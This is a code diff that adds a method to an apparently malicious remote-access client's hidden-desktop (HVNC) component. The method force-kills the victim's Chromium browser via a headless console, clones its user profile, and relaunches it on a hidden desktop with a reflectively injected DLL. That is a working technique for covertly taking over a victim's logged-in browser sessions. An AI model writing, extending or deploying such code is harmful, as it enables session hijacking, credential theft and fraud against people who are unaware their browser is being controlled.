@@ -603,6 +603,64 @@ namespace Pulsar.Client.Helper.HVNC
             }
         }
 
+        public void StartGenericChromium(byte[] dllbytes, string browserPath, string searchPattern, string replacementPath)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(browserPath) || !File.Exists(browserPath))
+                {
+                    Debug.WriteLine($"Generic Chromium browser executable not found at: {browserPath}");
+                    return;
+                }
+
+                if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
+                {
+                    Debug.WriteLine("Search pattern and replacement path are required for generic Chromium browser.");
+                    return;
+                }
+
+                Debug.WriteLine($"Starting Generic Chromium Browser: {browserPath}");
+                Debug.WriteLine($"Search Pattern: {searchPattern}");
+                Debug.WriteLine($"Replacement Path: {replacementPath}");
+
+                string processName = Path.GetFileNameWithoutExtension(browserPath);
+                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";
+                
+                STARTUPINFO startupInfo = default(STARTUPINFO);
+                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
+                startupInfo.lpDesktop = this.DesktopName;
+                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
+
+                Debug.WriteLine($"Killing any existing {processName}.exe processes...");
+                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
+                {
+                    Debug.WriteLine($"Waiting for {processName}.exe processes to terminate...");
+                    WaitForProcessCompletion(processInfo, 5000);
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
+                    Thread.Sleep(500);
+                }
+
+                CloneBrowserProfile(searchPattern, replacementPath);
+
+                try
+                {
+                    KDOTInjector.Start(dllbytes, browserPath, searchPattern, replacementPath);
+                    Debug.WriteLine($"Generic Chromium browser started successfully with reflective DLL injection.");
+                }
+                catch (Exception injectionEx)
+                {
+                    Debug.WriteLine($"Error during generic Chromium DLL injection: {injectionEx.Message}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error starting generic Chromium browser: {ex.Message}");
+            }
+        }
+
         private string DesktopName;
 
         private struct STARTUPINFO
